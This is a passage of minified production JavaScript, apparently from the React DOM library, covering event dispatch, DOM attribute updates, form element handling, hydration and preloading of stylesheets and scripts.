v=y.nodeName,!v||v.toLowerCase()!=="input"||y.type!=="checkbox"&&y.type!=="radio"?g&&ei(g.elementType)&&(ae=$c):ae=xm;if(ae&&(ae=ae(e,g))){Zc(R,ae,a,E);break e}w&&w(e,y,g),e==="focusout"&&g&&y.type==="number"&&g.memoizedProps.value!=null&&Fs(y,"number",y.value)}switch(w=g?Ml(g):window,e){case"focusin":(Ic(w)||w.contentEditable==="true")&&(Pa=w,pi=g,Hl=null);break;case"focusout":Hl=pi=Pa=null;break;case"mousedown":hi=!0;break;case"contextmenu":case"mouseup":case"dragend":hi=!1,nu(R,a,E);break;case"selectionchange":if(Dm)break;case"keydown":case"keyup":nu(R,a,E)}var I;if(ri)e:{switch(e){case"compositionstart":var ee="onCompositionStart";break e;case"compositionend":ee="onCompositionEnd";break e;case"compositionupdate":ee="onCompositionUpdate";break e}ee=void 0}else Ja?Vc(e,a)&&(ee="onCompositionEnd"):e==="keydown"&&a.keyCode===229&&(ee="onCompositionStart");ee&&(Qc&&a.locale!=="ko"&&(Ja||ee!=="onCompositionStart"?ee==="onCompositionEnd"&&Ja&&(I=zc()):(ea=E,si="value"in ea?ea.value:ea.textContent,Ja=!0)),w=As(g,ee),0<w.length&&(ee=new Hc(ee,e,null,a,E),R.push({event:ee,listeners:w}),I?ee.data=I:(I=Xc(a),I!==null&&(ee.data=I)))),(I=Sm?bm(e,a):Em(e,a))&&(ee=As(g,"onBeforeInput"),0<ee.length&&(w=new Hc("onBeforeInput","beforeinput",null,a,E),R.push({event:w,listeners:ee}),w.data=I)),fp(R,e,g,a,E)}kd(R,t)})}function fn(e,t,a){return{instance:e,listener:t,currentTarget:a}}function As(e,t){for(var a=t+"Capture",l=[];e!==null;){var n=e,s=n.stateNode;if(n=n.tag,n!==5&&n!==26&&n!==27||s===null||(n=ql(e,a),n!=null&&l.unshift(fn(e,n,s)),n=ql(e,t),n!=null&&l.push(fn(e,n,s))),e.tag===3)return l;e=e.return}return[]}function gp(e){if(e===null)return null;do e=e.return;while(e&&e.tag!==5&&e.tag!==27);return e||null}function qd(e,t,a,l,n){for(var s=t._reactName,i=[];a!==null&&a!==l;){var o=a,c=o.alternate,g=o.stateNode;if(o=o.tag,c!==null&&c===l)break;o!==5&&o!==26&&o!==27||g===null||(c=g,n?(g=ql(a,s),g!=null&&i.unshift(fn(a,g,c))):n||(g=ql(a,s),g!=null&&i.push(fn(a,g,c)))),a=a.return}i.length!==0&&e.push({event:t,listeners:i})}var yp=/\r\n?/g,vp=/\u0000|\uFFFD/g;function Nd(e){return(typeof e=="string"?e:""+e).replace(yp,`
`).replace(vp,"")}function Ld(e,t){return t=Nd(t),Nd(e)===t}function ue(e,t,a,l,n,s){switch(a){case"children":typeof l=="string"?t==="body"||t==="textarea"&&l===""||Za(e,l):(typeof l=="number"||typeof l=="bigint")&&t!=="body"&&Za(e,""+l);break;case"className":Dn(e,"class",l);break;case"tabIndex":Dn(e,"tabindex",l);break;case"dir":case"role":case"viewBox":case"width":case"height":Dn(e,a,l);break;case"style":Lc(e,l,s);break;case"data":if(t!=="object"){Dn(e,"data",l);break}case"src":case"href":if(l===""&&(t!=="a"||a!=="href")){e.removeAttribute(a);break}if(l==null||typeof l=="function"||typeof l=="symbol"||typeof l=="boolean"){e.removeAttribute(a);break}l=Mn(""+l),e.setAttribute(a,l);break;case"action":case"formAction":if(typeof l=="function"){e.setAttribute(a,"javascript:throw new Error('A React form was unexpectedly submitted. If you called form.submit() manually, consider using form.requestSubmit() instead. If you\\'re trying to use event.stopPropagation() in a submit event handler, consider also calling event.preventDefault().')");break}else typeof s=="function"&&(a==="formAction"?(t!=="input"&&ue(e,t,"name",n.name,n,null),ue(e,t,"formEncType",n.formEncType,n,null),ue(e,t,"formMethod",n.formMethod,n,null),ue(e,t,"formTarget",n.formTarget,n,null)):(ue(e,t,"encType",n.encType,n,null),ue(e,t,"method",n.method,n,null),ue(e,t,"target",n.target,n,null)));if(l==null||typeof l=="symbol"||typeof l=="boolean"){e.removeAttribute(a);break}l=Mn(""+l),e.setAttribute(a,l);break;case"onClick":l!=null&&(e.onclick=Lt);break;case"onScroll":l!=null&&J("scroll",e);break;case"onScrollEnd":l!=null&&J("scrollend",e);break;case"dangerouslySetInnerHTML":if(l!=null){if(typeof l!="object"||!("__html"in l))throw Error(m(61));if(a=l.__html,a!=null){if(n.children!=null)throw Error(m(60));e.innerHTML=a}}break;case"multiple":e.multiple=l&&typeof l!="function"&&typeof l!="symbol";break;case"muted":e.muted=l&&typeof l!="function"&&typeof l!="symbol";break;case"suppressContentEditableWarning":case"suppressHydrationWarning":case"defaultValue":case"defaultChecked":case"innerHTML":case"ref":break;case"autoFocus":break;case"xlinkHref":if(l==null||typeof l=="function"||typeof l=="boolean"||typeof l=="symbol"){e.removeAttribute("xlink:href");break}a=Mn(""+l),e.setAttributeNS("http://www.w3.org/1999/xlink","xlink:href",a);break;case"contentEditable":case"spellCheck":case"draggable":case"value":case"autoReverse":case"externalResourcesRequired":case"focusable":case"preserveAlpha":l!=null&&typeof l!="function"&&typeof l!="symbol"?e.setAttribute(a,""+l):e.removeAttribute(a);break;case"inert":case"allowFullScreen":case"async":case"autoPlay":case"controls":case"default":case"defer":case"disabled":case"disablePictureInPicture":case"disableRemotePlayback":case"formNoValidate":case"hidden":case"loop":case"noModule":case"noValidate":case"open":case"playsInline":case"readOnly":case"required":case"reversed":case"scoped":case"seamless":case"itemScope":l&&typeof l!="function"&&typeof l!="symbol"?e.setAttribute(a,""):e.removeAttribute(a);break;case"capture":case"download":l===!0?e.setAttribute(a,""):l!==!1&&l!=null&&typeof l!="function"&&typeof l!="symbol"?e.setAttribute(a,l):e.removeAttribute(a);break;case"cols":case"rows":case"size":case"span":l!=null&&typeof l!="function"&&typeof l!="symbol"&&!isNaN(l)&&1<=l?e.setAttribute(a,l):e.removeAttribute(a);break;case"rowSpan":case"start":l==null||typeof l=="function"||typeof l=="symbol"||isNaN(l)?e.removeAttribute(a):e.setAttribute(a,l);break;case"popover":J("beforetoggle",e),J("toggle",e),On(e,"popover",l);break;case"xlinkActuate":Nt(e,"http://www.w3.org/1999/xlink","xlink:actuate",l);break;case"xlinkArcrole":Nt(e,"http://www.w3.org/1999/xlink","xlink:arcrole",l);break;case"xlinkRole":Nt(e,"http://www.w3.org/1999/xlink","xlink:role",l);break;case"xlinkShow":Nt(e,"http://www.w3.org/1999/xlink","xlink:show",l);break;case"xlinkTitle":Nt(e,"http://www.w3.org/1999/xlink","xlink:title",l);break;case"xlinkType":Nt(e,"http://www.w3.org/1999/xlink","xlink:type",l);break;case"xmlBase":Nt(e,"http://www.w3.org/XML/1998/namespace","xml:base",l);break;case"xmlLang":Nt(e,"http://www.w3.org/XML/1998/namespace","xml:lang",l);break;case"xmlSpace":Nt(e,"http://www.w3.org/XML/1998/namespace","xml:space",l);break;case"is":On(e,"is",l);break;case"innerText":case"textContent":break;default:(!(2<a.length)||a[0]!=="o"&&a[0]!=="O"||a[1]!=="n"&&a[1]!=="N")&&(a=Xf.get(a)||a,On(e,a,l))}}function Go(e,t,a,l,n,s){switch(a){case"style":Lc(e,l,s);break;case"dangerouslySetInnerHTML":if(l!=null){if(typeof l!="object"||!("__html"in l))throw Error(m(61));if(a=l.__html,a!=null){if(n.children!=null)throw Error(m(60));e.innerHTML=a}}break;case"children":typeof l=="string"?Za(e,l):(typeof l=="number"||typeof l=="bigint")&&Za(e,""+l);break;case"onScroll":l!=null&&J("scroll",e);break;case"onScrollEnd":l!=null&&J("scrollend",e);break;case"onClick":l!=null&&(e.onclick=Lt);break;case"suppressContentEditableWarning":case"suppressHydrationWarning":case"innerHTML":case"ref":break;case"innerText":case"textContent":break;default:if(!Ac.hasOwnProperty(a))e:{if(a[0]==="o"&&a[1]==="n"&&(n=a.endsWith("Capture"),t=a.slice(2,n?a.length-7:void 0),s=e[Xe]||null,s=s!=null?s[a]:null,typeof s=="function"&&e.removeEventListener(t,s,n),typeof l=="function")){typeof s!="function"&&s!==null&&(a in e?e[a]=null:e.hasAttribute(a)&&e.removeAttribute(a)),e.addEventListener(t,l,n);break e}a in e?e[a]=l:l===!0?e.setAttribute(a,""):On(e,a,l)}}}function je(e,t,a){switch(t){case"div":case"span":case"svg":case"path":case"a":case"g":case"p":case"li":break;case"img":J("error",e),J("load",e);var l=!1,n=!1,s;for(s in a)if(a.hasOwnProperty(s)){var i=a[s];if(i!=null)switch(s){case"src":l=!0;break;case"srcSet":n=!0;break;case"children":case"dangerouslySetInnerHTML":throw Error(m(137,t));default:ue(e,t,s,i,a,null)}}n&&ue(e,t,"srcSet",a.srcSet,a,null),l&&ue(e,t,"src",a.src,a,null);return;case"input":J("invalid",e);var o=s=i=n=null,c=null,g=null;for(l in a)if(a.hasOwnProperty(l)){var E=a[l];if(E!=null)switch(l){case"name":n=E;break;case"type":i=E;break;case"checked":c=E;break;case"defaultChecked":g=E;break;case"value":s=E;break;case"defaultValue":o=E;break;case"children":case"dangerouslySetInnerHTML":if(E!=null)throw Error(m(137,t));break;default:ue(e,t,l,E,a,null)}}kc(e,s,o,c,g,i,n,!1);return;case"select":J("invalid",e),l=i=s=null;for(n in a)if(a.hasOwnProperty(n)&&(o=a[n],o!=null))switch(n){case"value":s=o;break;case"defaultValue":i=o;break;case"multiple":l=o;default:ue(e,t,n,o,a,null)}t=s,a=i,e.multiple=!!l,t!=null?Ia(e,!!l,t,!1):a!=null&&Ia(e,!!l,a,!0);return;case"textarea":J("invalid",e),s=n=l=null;for(i in a)if(a.hasOwnProperty(i)&&(o=a[i],o!=null))switch(i){case"value":l=o;break;case"defaultValue":n=o;break;case"children":s=o;break;case"dangerouslySetInnerHTML":if(o!=null)throw Error(m(91));break;default:ue(e,t,i,o,a,null)}qc(e,l,n,s);return;case"option":for(c in a)if(a.hasOwnProperty(c)&&(l=a[c],l!=null))switch(c){case"selected":e.selected=l&&typeof l!="function"&&typeof l!="symbol";break;default:ue(e,t,c,l,a,null)}return;case"dialog":J("beforetoggle",e),J("toggle",e),J("cancel",e),J("close",e);break;case"iframe":case"object":J("load",e);break;case"video":case"audio":for(l=0;l<dn.length;l++)J(dn[l],e);break;case"image":J("error",e),J("load",e);break;case"details":J("toggle",e);break;case"embed":case"source":case"link":J("error",e),J("load",e);case"area":case"base":case"br":case"col":case"hr":case"keygen":case"meta":case"param":case"track":case"wbr":case"menuitem":for(g in a)if(a.hasOwnProperty(g)&&(l=a[g],l!=null))switch(g){case"children":case"dangerouslySetInnerHTML":throw Error(m(137,t));default:ue(e,t,g,l,a,null)}return;default:if(ei(t)){for(E in a)a.hasOwnProperty(E)&&(l=a[E],l!==void 0&&Go(e,t,E,l,a,void 0));return}}for(o in a)a.hasOwnProperty(o)&&(l=a[o],l!=null&&ue(e,t,o,l,a,null))}function Sp(e,t,a,l){switch(t){case"div":case"span":case"svg":case"path":case"a":case"g":case"p":case"li":break;case"input":var n=null,s=null,i=null,o=null,c=null,g=null,E=null;for(v in a){var R=a[v];if(a.hasOwnProperty(v)&&R!=null)switch(v){case"checked":break;case"value":break;case"defaultValue":c=R;default:l.hasOwnProperty(v)||ue(e,t,v,null,l,R)}}for(var y in l){var v=l[y];if(R=a[y],l.hasOwnProperty(y)&&(v!=null||R!=null))switch(y){case"type":s=v;break;case"name":n=v;break;case"checked":g=v;break;case"defaultChecked":E=v;break;case"value":i=v;break;case"defaultValue":o=v;break;case"children":case"dangerouslySetInnerHTML":if(v!=null)throw Error(m(137,t));break;default:v!==R&&ue(e,t,y,v,l,R)}}Ps(e,i,o,c,g,E,s,n);return;case"select":v=i=o=y=null;for(s in a)if(c=a[s],a.hasOwnProperty(s)&&c!=null)switch(s){case"value":break;case"multiple":v=c;default:l.hasOwnProperty(s)||ue(e,t,s,null,l,c)}for(n in l)if(s=l[n],c=a[n],l.hasOwnProperty(n)&&(s!=null||c!=null))switch(n){case"value":y=s;break;case"defaultValue":o=s;break;case"multiple":i=s;default:s!==c&&ue(e,t,n,s,l,c)}t=o,a=i,l=v,y!=null?Ia(e,!!a,y,!1):!!l!=!!a&&(t!=null?Ia(e,!!a,t,!0):Ia(e,!!a,a?[]:"",!1));return;case"textarea":v=y=null;for(o in a)if(n=a[o],a.hasOwnProperty(o)&&n!=null&&!l.hasOwnProperty(o))switch(o){case"value":break;case"children":break;default:ue(e,t,o,null,l,n)}for(i in l)if(n=l[i],s=a[i],l.hasOwnProperty(i)&&(n!=null||s!=null))switch(i){case"value":y=n;break;case"defaultValue":v=n;break;case"children":break;case"dangerouslySetInnerHTML":if(n!=null)throw Error(m(91));break;default:n!==s&&ue(e,t,i,n,l,s)}Mc(e,y,v);return;case"option":for(var N in a)if(y=a[N],a.hasOwnProperty(N)&&y!=null&&!l.hasOwnProperty(N))switch(N){case"selected":e.selected=!1;break;default:ue(e,t,N,null,l,y)}for(c in l)if(y=l[c],v=a[c],l.hasOwnProperty(c)&&y!==v&&(y!=null||v!=null))switch(c){case"selected":e.selected=y&&typeof y!="function"&&typeof y!="symbol";break;default:ue(e,t,c,y,l,v)}return;case"img":case"link":case"area":case"base":case"br":case"col":case"embed":case"hr":case"keygen":case"meta":case"param":case"source":case"track":case"wbr":case"menuitem":for(var G in a)y=a[G],a.hasOwnProperty(G)&&y!=null&&!l.hasOwnProperty(G)&&ue(e,t,G,null,l,y);for(g in l)if(y=l[g],v=a[g],l.hasOwnProperty(g)&&y!==v&&(y!=null||v!=null))switch(g){case"children":case"dangerouslySetInnerHTML":if(y!=null)throw Error(m(137,t));break;default:ue(e,t,g,y,l,v)}return;default:if(ei(t)){for(var re in a)y=a[re],a.hasOwnProperty(re)&&y!==void 0&&!l.hasOwnProperty(re)&&Go(e,t,re,void 0,l,y);for(E in l)y=l[E],v=a[E],!l.hasOwnProperty(E)||y===v||y===void 0&&v===void 0||Go(e,t,E,y,l,v);return}}for(var f in a)y=a[f],a.hasOwnProperty(f)&&y!=null&&!l.hasOwnProperty(f)&&ue(e,t,f,null,l,y);for(R in l)y=l[R],v=a[R],!l.hasOwnProperty(R)||y===v||y==null&&v==null||ue(e,t,R,y,l,v)}function wd(e){switch(e){case"css":case"script":case"font":case"img":case"image":case"input":case"link":return!0;default:return!1}}function bp(){if(typeof performance.getEntriesByType=="function"){for(var e=0,t=0,a=performance.getEntriesByType("resource"),l=0;l<a.length;l++){var n=a[l],s=n.transferSize,i=n.initiatorType,o=n.duration;if(s&&o&&wd(i)){for(i=0,o=n.responseEnd,l+=1;l<a.length;l++){var c=a[l],g=c.startTime;if(g>o)break;var E=c.transferSize,R=c.initiatorType;E&&wd(R)&&(c=c.responseEnd,i+=E*(c<o?1:(o-g)/(c-g)))}if(--l,t+=8*(s+i)/(n.duration/1e3),e++,10<e)break}}if(0<e)return t/e/1e6}return navigator.connection&&(e=navigator.connection.downlink,typeof e=="number")?e:5}var Qo=null,Yo=null;function xs(e){return e.nodeType===9?e:e.ownerDocument}function Ud(e){switch(e){case"http://www.w3.org/2000/svg":return 1;case"http://www.w3.org/1998/Math/MathML":return 2;default:return 0}}function zd(e,t){if(e===0)switch(t){case"svg":return 1;case"math":return 2;default:return 0}return e===1&&t==="foreignObject"?0:e}function Ko(e,t){return e==="textarea"||e==="noscript"||typeof t.children=="string"||typeof t.children=="number"||typeof t.children=="bigint"||typeof t.dangerouslySetInnerHTML=="object"&&t.dangerouslySetInnerHTML!==null&&t.dangerouslySetInnerHTML.__html!=null}var Vo=null;function Ep(){var e=window.event;return e&&e.type==="popstate"?e===Vo?!1:(Vo=e,!0):(Vo=null,!1)}var jd=typeof setTimeout=="function"?setTimeout:void 0,_p=typeof clearTimeout=="function"?clearTimeout:void 0,Bd=typeof Promise=="function"?Promise:void 0,Tp=typeof queueMicrotask=="function"?queueMicrotask:typeof Bd<"u"?function(e){return Bd.resolve(null).then(e).catch(Rp)}:jd;function Rp(e){setTimeout(function(){throw e})}function ya(e){return e==="head"}function Hd(e,t){var a=t,l=0;do{var n=a.nextSibling;if(e.removeChild(a),n&&n.nodeType===8)if(a=n.data,a==="/$"||a==="/&"){if(l===0){e.removeChild(n),Al(t);return}l--}else if(a==="$"||a==="$?"||a==="$~"||a==="$!"||a==="&")l++;else if(a==="html")mn(e.ownerDocument.documentElement);else if(a==="head"){a=e.ownerDocument.head,mn(a);for(var s=a.firstChild;s;){var i=s.nextSibling,o=s.nodeName;s[kl]||o==="SCRIPT"||o==="STYLE"||o==="LINK"&&s.rel.toLowerCase()==="stylesheet"||a.removeChild(s),s=i}}else a==="body"&&mn(e.ownerDocument.body);a=n}while(a);Al(t)}function Gd(e,t){var a=e;e=0;do{var l=a.nextSibling;if(a.nodeType===1?t?(a._stashedDisplay=a.style.display,a.style.display="none"):(a.style.display=a._stashedDisplay||"",a.getAttribute("style")===""&&a.removeAttribute("style")):a.nodeType===3&&(t?(a._stashedText=a.nodeValue,a.nodeValue=""):a.nodeValue=a._stashedText||""),l&&l.nodeType===8)if(a=l.data,a==="/$"){if(e===0)break;e--}else a!=="$"&&a!=="$?"&&a!=="$~"&&a!=="$!"||e++;a=l}while(a)}function Xo(e){var t=e.firstChild;for(t&&t.nodeType===10&&(t=t.nextSibling);t;){var a=t;switch(t=t.nextSibling,a.nodeName){case"HTML":case"HEAD":case"BODY":Xo(a),Ws(a);continue;case"SCRIPT":case"STYLE":continue;case"LINK":if(a.rel.toLowerCase()==="stylesheet")continue}e.removeChild(a)}}function Ap(e,t,a,l){for(;e.nodeType===1;){var n=a;if(e.nodeName.toLowerCase()!==t.toLowerCase()){if(!l&&(e.nodeName!=="INPUT"||e.type!=="hidden"))break}else if(l){if(!e[kl])switch(t){case"meta":if(!e.hasAttribute("itemprop"))break;return e;case"link":if(s=e.getAttribute("rel"),s==="stylesheet"&&e.hasAttribute("data-precedence"))break;if(s!==n.rel||e.getAttribute("href")!==(n.href==null||n.href===""?null:n.href)||e.getAttribute("crossorigin")!==(n.crossOrigin==null?null:n.crossOrigin)||e.getAttribute("title")!==(n.title==null?null:n.title))break;return e;case"style":if(e.hasAttribute("data-precedence"))break;return e;case"script":if(s=e.getAttribute("src"),(s!==(n.src==null?null:n.src)||e.getAttribute("type")!==(n.type==null?null:n.type)||e.getAttribute("crossorigin")!==(n.crossOrigin==null?null:n.crossOrigin))&&s&&e.hasAttribute("async")&&!e.hasAttribute("itemprop"))break;return e;default:return e}}else if(t==="input"&&e.type==="hidden"){var s=n.name==null?null:""+n.name;if(n.type==="hidden"&&e.getAttribute("name")===s)return e}else return e;if(e=Et(e.nextSibling),e===null)break}return null}function xp(e,t,a){if(t==="")return null;for(;e.nodeType!==3;)if((e.nodeType!==1||e.nodeName!=="INPUT"||e.type!=="hidden")&&!a||(e=Et(e.nextSibling),e===null))return null;return e}function Qd(e,t){for(;e.nodeType!==8;)if((e.nodeType!==1||e.nodeName!=="INPUT"||e.type!=="hidden")&&!t||(e=Et(e.nextSibling),e===null))return null;return e}function Io(e){return e.data==="$?"||e.data==="$~"}function Zo(e){return e.data==="$!"||e.data==="$?"&&e.ownerDocument.readyState!=="loading"}function Cp(e,t){var a=e.ownerDocument;if(e.data==="$~")e._reactRetry=t;else if(e.data!=="$?"||a.readyState!=="loading")t();else{var l=function(){t(),a.removeEventListener("DOMContentLoaded",l)};a.addEventListener("DOMContentLoaded",l),e._reactRetry=l}}function Et(e){for(;e!=null;e=e.nextSibling){var t=e.nodeType;if(t===1||t===3)break;if(t===8){if(t=e.data,t==="$"||t==="$!"||t==="$?"||t==="$~"||t==="&"||t==="F!"||t==="F")break;if(t==="/$"||t==="/&")return null}}return e}var $o=null;function Yd(e){e=e.nextSibling;for(var t=0;e;){if(e.nodeType===8){var a=e.data;if(a==="/$"||a==="/&"){if(t===0)return Et(e.nextSibling);t--}else a!=="$"&&a!=="$!"&&a!=="$?"&&a!=="$~"&&a!=="&"||t++}e=e.nextSibling}return null}function Kd(e){e=e.previousSibling;for(var t=0;e;){if(e.nodeType===8){var a=e.data;if(a==="$"||a==="$!"||a==="$?"||a==="$~"||a==="&"){if(t===0)return e;t--}else a!=="/$"&&a!=="/&"||t++}e=e.previousSibling}return null}function Vd(e,t,a){switch(t=xs(a),e){case"html":if(e=t.documentElement,!e)throw Error(m(452));return e;case"head":if(e=t.head,!e)throw Error(m(453));return e;case"body":if(e=t.body,!e)throw Error(m(454));return e;default:throw Error(m(451))}}function mn(e){for(var t=e.attributes;t.length;)e.removeAttributeNode(t[0]);Ws(e)}var _t=new Map,Xd=new Set;function Cs(e){return typeof e.getRootNode=="function"?e.getRootNode():e.nodeType===9?e:e.ownerDocument}var Wt=O.d;O.d={f:Op,r:Dp,D:kp,C:Mp,L:qp,m:Np,X:wp,S:Lp,M:Up};function Op(){var e=Wt.f(),t=vs();return e||t}function Dp(e){var t=Ka(e);t!==null&&t.tag===5&&t.type==="form"?ur(t):Wt.r(e)}var _l=typeof document>"u"?null:document;function Id(e,t,a){var l=_l;if(l&&typeof t=="string"&&t){var n=pt(t);n='link[rel="'+e+'"][href="'+n+'"]',typeof a=="string"&&(n+='[crossorigin="'+a+'"]'),Xd.has(n)||(Xd.add(n),e={rel:e,crossOrigin:a,href:t},l.querySelector(n)===null&&(t=l.createElement("link"),je(t,"link",e),Me(t),l.head.appendChild(t)))}}function kp(e){Wt.D(e),Id("dns-prefetch",e,null)}function Mp(e,t){Wt.C(e,t),Id("preconnect",e,t)}function qp(e,t,a){Wt.L(e,t,a);var l=_l;if(l&&e&&t){var n='link[rel="preload"][as="'+pt(t)+'"]';t==="image"&&a&&a.imageSrcSet?(n+='[imagesrcset="'+pt(a.imageSrcSet)+'"]',typeof a.imageSizes=="string"&&(n+='[imagesizes="'+pt(a.imageSizes)+'"]')):n+='[href="'+pt(e)+'"]';var s=n;switch(t){case"style":s=Tl(e);break;case"script":s=Rl(e)}_t.has(s)||(e=D({rel:"preload",href:t==="image"&&a&&a.imageSrcSet?void 0:e,as:t},a),_t.set(s,e),l.querySelector(n)!==null||t==="style"&&l.querySelector(pn(s))||t==="script"&&l.querySelector(hn(s))||(t=l.createElement("link"),je(t,"link",e),Me(t),l.head.appendChild(t)))}}function Np(e,t){Wt.m(e,t);var a=_l;if(a&&e){var l=t&&typeof t.as=="string"?t.as:"script",n='link[rel="modulepreload"][as="'+pt(l)+'"][href="'+pt(e)+'"]',s=n;switch(l){case"audioworklet":case"paintworklet":case"serviceworker":case"sharedworker":case"worker":case"script":s=Rl(e)}if(!_t.has(s)&&(e=D({rel:"modulepreload",href:e},t),_t.set(s,e),a.querySelector(n)===null)){switch(l){case"audioworklet":case"paintworklet":case"serviceworker":case"sharedworker":case"worker":case"script":if(a.querySelector(hn(s)))return}l=a.createElement("link"),je(l,"link",e),Me(l),a.head.appendChild(l)}}}function Lp(e,t,a){Wt.S(e,t,a);var l=_l;if(l&&e){var n=Va(l).hoistableStyles,s=Tl(e);t=t||"default";var i=n.get(s);if(!i){var o={loading:0,preload:null};if(i=l.querySelector(pn(s)))o.loading=5;else{e=D({rel:"stylesheet",href:e,"data-precedence":t},a),(a=_t.get(s))&&Wo(e,a);var c=i=l.createElement("link");Me(c),je(c,"link",e),c._p=new Promise(function(g,E){c.onload=g,c.onerror=E}),c.addEventListener("load",function(){o.loading|=1}),c.addEventListener("error",function(){o.loading|=2}),o.loading|=4,Os(i,t,l)}i={type:"stylesheet",instance:i,count:1,state:o},n.set(s,i)}}}function wp(e,t){Wt.X(e,t);var a=_l;if(a&&e){var l=Va(a).hoistableScripts,n=Rl(e),s=l.get(n);s||(s=a.querySelector(hn(n)),s||(e=D({src:e,async:!0},t),(t=_t.get(n))&&Jo(e,t),s=a.createElement("script"),Me(s),je(s,"link",e),a.head.appendChild(s)),s={type:"script",instance:s,count:1,state:null},l.set(n,s))}}function Up(e,t){Wt.M(e,t);var a=_l;if(a&&e){var l=Va(a).hoistableScripts,n=Rl(e),s=l.get(n);s||(s=a.querySelector(hn(n)),s||(e=D({src:e,async:!0,type:"module"},t),(t=_t.get(n))&&Jo(e,t),s=a.createElement("script"),Me(s),je(s,"link",e),a.head.appendChild(s)),s={type:"script",instance:s,count:1,state:null},l.set(n,s))}}function Zd(e,t,a,l){var n=(n=V.current)?Cs(n):null;if(!n)throw Error(m(446));switch(e){case"meta":case"title":return null;case"style":return typeof a.precedence=="string"&&typeof a.href=="string"?(t=Tl(a.href),a=Va(n).hoistableStyles,l=a.get(t),l||(l={type:"style",instance:null,count:0,state:null},a.set(t,l)),l):{type:"void",instance:null,count:0,state:null};case"link":if(a.rel==="stylesheet"&&typeof a.href=="string"&&typeof a.precedence=="string"){e=Tl(a.href);var s=Va(n).hoistableStyles,i=s.get(e);if(i||(n=n.ownerDocument||n,i={type:"stylesheet",instance:null,count:0,state:{loading:0,preload:null}},s.set(e,i),(s=n.querySelector(pn(e)))&&!s._p&&(i.instance=s,i.state.loading=5),_t.has(e)||(a={rel:"preload",as:"style",href:a.href,crossOrigin:a.crossOrigin,integrity:a.integrity,media:a.media,hrefLang:a.hrefLang,referrerPolicy:a.referrerPolicy},_t.set(e,a),s||zp(n,e,a,i.state))),t&&l===null)throw Error(m(528,""));return i}if(t&&l!==null)throw Error(m(529,""));return null;case"script":return t=a.async,a=a.src,typeof a=="string"&&t&&typeof t!="function"&&typeof t!="symbol"?(t=Rl(a),a=Va(n).hoistableScripts,l=a.get(t),l||(l={type:"script",instance:null,count:0,state:null},a.set(t,l)),l):{type:"void",instance:null,count:0,state:null};default:throw Error(m(444,e))}}function Tl(e){return'href="'+pt(e)+'"'}function pn(e){return'link[rel="stylesheet"]['+e+"]"}function $d(e){return D({},e,{"data-precedence":e.precedence,precedence:null})}function zp(e,t,a,l){e.querySelector('link[rel="preload"][as="style"]['+t+"]")?l.loading=1:(t=e.createElement("link"),l.preload=t,t.addEventListener("load",function(){return l.loading|=1}),t.addEventListener("error",function(){return l.loading|=2}),je(t,"link",a),Me(t),e.head.appendChild(t))}function Rl(e){return'[src="'+pt(e)+'"]'}function hn(e){return"script[async]"+e}function Wd(e,t,a){if(t.count++,t.instance===null)switch(t.type){case"style":var l=e.querySelector('style[data-href~="'+pt(a.href)+'"]');if(l)return t.instance=l,Me(l),l;var n=D({},a,{"data-href":a.href,"data-precedence":a.precedence,href:null,precedence:null});return l=(e.ownerDocument||e).createElement("style"),Me(l),je(l,"style",n),Os(l,a.precedence,e),t.instance=l;case"stylesheet":n=Tl(a.href);var s=e.querySelector(pn(n));if(s)return t.state.loading|=4,t.instance=s,Me(s),s;l=$d(a),(n=_t.get(n))&&Wo(l,n),s=(e.ownerDocument||e).createElement("link"),Me(s);var i=s;return i._p=new Promise(function(o,c){i.onload=o,i.onerror=c}),je(s,"link",l),t.state.loading|=4,Os(s,a.precedence,e),t.instance=s;case"script":return s=Rl(a.src),(n=e.querySelector(hn(s)))?(t.instance=n,Me(n),n):(l=a,(n=_t.get(s))&&(l=D({},a),Jo(l,n)),e=e.ownerDocument||e,n=e.createElement("script"),Me(n),je(n,"link",l),e.head.appendChild(n),t.instance=n);case"void":return null;default:throw Error(m(443,t.type))}else t.type==="stylesheet"&&(t.state.loading&4)===0&&(l=t.instance,t.state.loading|=4,Os(l,a.precedence,e));return t.instance}function Os(e,t,a){for(var l=a.querySelectorAll('link[rel="stylesheet"][data-precedence],style[data-precedence]'),n=l.length?l[l.length-1]:null,s=n,i=0;i<l.length;i++){var o=l[i];if(o.dataset.precedence===t)s=o;else if(s!==n)break}s?s.parentNode.insertBefore(e,s.nextSibling):(t=a.nodeType===9?a.head:a,t.insertBefore(e,t.firstChild))}function Wo(e,t){e.crossOrigin==null&&(e.crossOrigin=t.crossOrigin),e.referrerPolicy==null&&(e.referrerPolicy=t.referrerPolicy),e.title==null&&(e.title=t.title)}function Jo(e,t){e.crossOrigin==null&&(e.crossOrigin=t.crossOrigin),e.referrerPolicy==null&&(e.referrerPolicy=t.referrerPolicy),e.integrity==null&&(e.integrity=t.integrity)}var Ds=null;function Jd(e,t,a){if(Ds===null){var l=new Map,n=Ds=new Map;n.set(a,l)}else n=Ds,l=n.get(a),l||(l=new Map,n.set(a,l));if(l.has(e))return l;for(l.set(e,null),a=a.getElementsByTagName(e),n=0;n<a.length;n++){var s=a[n];if(!(s[kl]||s[Le]||e==="link"&&s.getAttribute("rel")==="stylesheet")&&s.namespaceURI!=="http://www.w3.org/2000/svg"){var i=s.getAttribute(t)||"";i=e+i;var o=l.get(i);o?o.push(s):l.set(i,[s])}}return l}function Pd(e,t,a){e=e.ownerDocument||e,e.head.insertBefore(a,t==="title"?e.querySelector("head > title"):null)}function jp(e,t,a){if(a===1||t.itemProp!=null)return!1;switch(e){case"meta":case"title":return!0;case"style":if(typeof t.precedence!="string"||typeof t.href!="string"||t.href==="")break;return!0;case"link":if(typeof t.rel!="string"||typeof t.href!="string"||t.href===""||t.onLoad||t.onError)break;switch(t.rel){case"stylesheet":return e=t.disabled,typeof t.precedence=="string"&&e==null;default:return!0}case"script":if(t.async&&typeof t.async!="function"&&typeof t.async!="symbol"&&!t.onLoad&&!t.onError&&t.src&&typeof t.src=="string")return!0}return!1}function Fd(e){return!(e.type==="stylesheet"&&(e.state.loading&3)===0)}function Bp(e,t,a,l){if(a.type==="stylesheet"&&(typeof l.media!="string"||matchMedia(l.media).matches!==!1)&&(a.state.loading&4)===0){if(a.instance===null){var n=Tl(l.href),s=t.querySelector(pn(n));if(s){t=s._p,t!==null&&typeof t=="object"&&typeof t.then=="function"&&(e.count++,e=ks.bind(e),t.then(e,e)),a.state.loading|=4,a.instance=s,Me(s);return}s=t.ownerDocument||t,l=$d(l),(n=_t.get(n))&&Wo(l,n),s=s.createElement("link"),Me(s);var i=s;i._p=new 